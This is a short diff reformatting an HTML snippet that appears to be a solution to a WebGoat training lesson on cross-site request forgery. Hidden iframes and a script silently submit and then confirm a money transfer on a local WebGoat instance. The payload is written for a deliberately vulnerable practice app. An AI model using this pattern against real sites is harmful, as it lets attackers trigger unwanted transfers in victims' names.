@@ -1,5 +1,1 @@
-<iframe id="iframe1" src="http://localhost:8090/WebGoat/attack?Screen=1232167937&menu=900&transfer=5000" width="100" height="100"></iframe>
-<script>
-    document.getElementById("iframe2").setAttribute("src", "http://localhost:8090/WebGoat/attack?transfer=CONFIRMED#attack/1232167937/900")
-</script>
-<iframe id="iframe2" src="" widht="100" height="100"></iframe>
+<iframe id="iframe1" src="http://localhost:8090/WebGoat/attack?Screen=1232167937&menu=900&transfer=5000" width="100" height="100"></iframe><script>document.getElementById("iframe2").setAttribute("src", "http://localhost:8090/WebGoat/attack?transfer=CONFIRMED#attack/1232167937/900")</script><iframe id="iframe2" src="" widht="100" height="100"></iframe>
